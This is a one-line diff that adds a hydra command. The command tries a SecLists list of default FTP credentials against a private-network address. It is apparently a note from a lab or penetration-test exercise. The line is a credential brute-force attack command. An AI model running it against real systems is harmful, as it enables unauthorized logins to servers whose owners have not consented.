@@ -1,0 +1,1 @@
+hydra -C /usr/share/seclists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt 192.168.180.183 ftp
